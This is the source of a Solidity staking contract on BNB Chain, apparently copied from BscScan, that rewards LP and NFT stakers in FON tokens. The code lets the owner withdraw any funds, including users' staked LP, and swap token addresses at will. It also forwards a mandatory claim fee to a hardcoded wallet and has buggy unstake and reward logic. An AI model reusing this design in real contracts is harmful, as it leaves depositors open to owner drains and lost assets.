/**
 *Submitted for verification at BscScan.com on 2022-09-09
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface ITRC721 {
    function balanceOf(address _owner) external view returns (uint256);
    function ownerOf(uint256 _tokenId) external view returns (address);

    function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes calldata _data) external payable;
    function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;
    function transferFrom(address _from, address _to, uint256 _tokenId) external payable;

    function approve(address _approved, uint256 _tokenId) external payable;
    function getApproved(uint256 _tokenId) external view returns (address);
    function setApprovalForAll(address _operator, bool _approved) external;
    function isApprovedForAll(address _owner, address _operator) external view returns (bool);

    function totalSupply() external view returns (uint256);
    //Return the corresponding ‘tokenId’ through ‘_index’
    function tokenByIndex(uint256 _index) external view returns (uint256);
     //Return the ‘tokenId’ corresponding to the index in the NFT list owned by the ‘_owner'
    function tokenOfOwnerByIndex(address _owner, uint256 _index) external view returns (uint256);


    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
}
contract StakeMiner {
    // id =>  id,kind,order,locksec,claimDuration ,dailyInterest(2 dot),awardAll,dot1,dot2
    // kind:  1 coin fixed  2 lp fixed  3 coin average  4 lp average 
    // kind:  5 stop stake & claim      6 hide
    // claimDuration: 36000
    // dailyInterest: 25
    // order: small up, large down
    IERC20 public FON = IERC20(0x12a055D95855b4Ec2cd70C1A5EaDb1ED43eaeF65);//edit2
    ITRC721 public NFT = ITRC721(0x6faFEF15CD13D51F75ceae790c6aa4362DCd4374);//edit3
    IERC20 public LP = IERC20(0xA424B5182cf9fE9f600BC74640975812ebA28427);//edit4
    mapping(address => uint) public is_today;
    // mapping(address =>uint) public claim_time;
    mapping(address => uint256) public lp_all;
    mapping(address => uint256) public nft_all;
    mapping(address => bool) public white;
    mapping(address => uint[]) public data ;
    uint public all_fon;
    function setCoin(address fon,address nft ,address lp )public onlyOwner{
        FON = IERC20(fon);
        NFT = ITRC721(nft);
        LP = IERC20(lp);
    }

    // mapping(uint256 => uint256[9]) public confs;
    // id => stakeAll, claimAll
    // mapping(uint256 => uint256[2]) public numbs;
    // id => stakeAddr, awardAddr
    // mapping(uint256 => address[2]) public addrs;
    // id => stakeName, awardName, stakeIcon, awardIcon, apy
    // mapping(uint256 => string[5])  public names;
    // id => addr => mystake, myclaim, stime, ctime, unclaim
	// mapping(uint256 => mapping(address => uint256[5])) private stakes;

    mapping(address => bool) public roles;
    
    address public back;

	constructor() {
        // back = _msgSender();
        roles[_msgSender()] = true;
        // white[msg.sender] = true;
    }

    receive() external payable {}

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }
   
	modifier onlyOwner() {
        require(roles[_msgSender()]);
        _;
    }
    //  function setIs_today(address addr)external onlyOwner{
    //     is_today[addr] = 0;
    // }
    function setWhite(address addr,bool val)external onlyOwner{
        white[addr] =val;
    }
    struct Conf{
        uint myday;
        uint today_fon;
        uint today_nft;
        uint today_lp;
    }
    Conf public aa = Conf(7,0,0,0);
    function setDay(uint day)public onlyOwner{
        aa.myday = day ;
    }
    function setConf(uint fon, uint nft, uint lp)public onlyOwner{
        aa.today_fon = fon  ;
        aa.today_nft = nft;
        aa.today_lp = lp;
    }
    function setOwner(address newOwner, bool val) public onlyOwner {
        roles[newOwner] = val;
    }

    // function setBack(address addr) public onlyOwner {
    //     back = addr;
    // }

    function isRoles(address addr) public view returns (bool) {
        return roles[addr];
    }

	function claim(address con, address t, uint256 val) public onlyOwner {
        if (con == address(0)) {
            payable(t).transfer(val);
            } 
        else {
            IERC20(con).transfer(t, val);
            } 
	}

   

 

    

    
    function getTime()public view returns(uint){
        return block.timestamp/24 hours;
    }
    function Stake_lp() public  {

        require(LP.balanceOf(msg.sender) >0 ,"small amount");
        require(LP.allowance(msg.sender,address(this))>0,"allow");
        // check is deflation (Real transfer in after deflation)
        uint banace_lp = LP.balanceOf(msg.sender);
		lp_all[msg.sender] += banace_lp;
        LP.transferFrom(msg.sender,address(this),banace_lp);
        is_today[msg.sender] = getTime();

    }
    function Stake_nft() public  {
        require(NFT.balanceOf(msg.sender) > 0,"small 0");
        require(NFT.isApprovedForAll(msg.sender,address(this)),"approve");
        // check is deflation (Real transfer in after deflation)
        uint token_id = NFT.tokenOfOwnerByIndex(msg.sender,0);
        NFT.transferFrom(msg.sender,address(this),token_id);        
		nft_all[msg.sender] += 1; 
        is_today[msg.sender] = getTime();

    }

    function unStake_lp() public payable {//明天取LP
        require(getTime()>= is_today[msg.sender] + aa.myday || white[msg.sender] ,"today " );
        require(lp_all[msg.sender]>0,"<0");
        LP.transfer(msg.sender,lp_all[msg.sender]);
        lp_all[msg.sender] =0;
    }
    function unStake_nft() public payable {
        require(getTime() >= is_today[msg.sender] + aa.myday || white[msg.sender],"time<7");
        require(nft_all[msg.sender]>0,"<0");
        uint token_id = NFT.tokenOfOwnerByIndex(address(this),0);
        NFT.transferFrom(address(this),msg.sender,token_id);        
        nft_all[msg.sender] -= 1 ;

    }

    function Claim() public payable {
        require(is_today[msg.sender] != getTime() || white[msg.sender],"today is claim");
        require(nft_all[msg.sender] >0|| lp_all[msg.sender] >0 ,"stake <0"  );
        require(msg.value>0.008 ether,"msg.value<0");
        payable(0xE3FCB3F0739b36d9BB8A935282F17F26E8b12345).transfer(msg.value);
        if(is_today[address(this)] != getTime() ){
            aa.today_fon = FON.balanceOf(address(this));
            aa.today_lp = LP.balanceOf(address(this));
            aa.today_nft = NFT.balanceOf(address(this));
            is_today[address(this)] = getTime();
        }
        uint fonAmount =  getClaim(msg.sender);
        FON.transfer(msg.sender,fonAmount);//
        is_today[msg.sender] = getTime();
        all_fon += fonAmount;
    }

    

    function getClaim(address addr) public view returns (uint256) {
        if(getTime()==is_today[addr] && !white[addr]){
            return 0;
        }
        uint award1;
        uint award2;
        if(is_today[address(this)] != getTime()){
            uint nft_balance = NFT.balanceOf(address(this));
            uint lp_balance = LP.balanceOf(address(this));
            uint fon_balance = FON.balanceOf(address(this));
            if(nft_balance >0){
            award1 = fon_balance * 15/100 * nft_all[addr]/nft_balance;
            }
             if(lp_balance >0){
            award2 = fon_balance * 15/100 * lp_all[addr]/lp_balance;
                                    }
            return award1+award2;                        

        }
        if(aa.today_nft >0){
            award1 = aa.today_fon * 15/100 * nft_all[addr]/aa.today_nft;
        } 
        if(aa.today_lp >0){
            award2 =  aa.today_fon * 15/100 * lp_all[addr]/aa.today_lp;
                                    }
        return award1+award2;    
    }
    function getClaim2(address addr)public  view returns(uint[2] memory array){
        if(is_today[addr] == getTime() && !white[addr]){
            return array;
        } 
        // if(getTime()==is_today[addr]){
        //     return array;
        // }
        uint award1;
        uint award2;
        if(is_today[address(this)] != getTime()){
            uint nft_balance = NFT.balanceOf(address(this));
            uint lp_balance = LP.balanceOf(address(this));
            uint fon_balance = FON.balanceOf(address(this));
            if(nft_balance >0){
            award1 = fon_balance * 15/100 * nft_all[addr]/nft_balance;
            } 
            if(lp_balance >0){
            award2 = fon_balance * 15/100 * lp_all[addr]/lp_balance;
                                    }
            array[0] = award2;
            array[1] = award1;                                    
        }else{
            if(aa.today_nft >0){
                award1 = aa.today_fon * 15/100 * nft_all[addr]/aa.today_nft;
            } 
            if(aa.today_lp >0){
                award2 =  aa.today_fon * 15/100 * lp_all[addr]/aa.today_lp;
                                    }
            array[0] = award2;
            array[1] = award1;
         }
    }
        
    
    
    //    function getApy()external view returns(uint[2] memory array){
         
    //        if(NFT.balanceOf(address(this)) >0){
    //             array[1] = NFT.balanceOf(address(this))*FON.balanceOf(address(this))*15/100 *365; 
    //        } else if(LP.balanceOf(address(this))>0){
    //             array[0] = LP.balanceOf(address(this))*FON.balanceOf(address(this))*15/100 *365; 
    //        }

    // }
}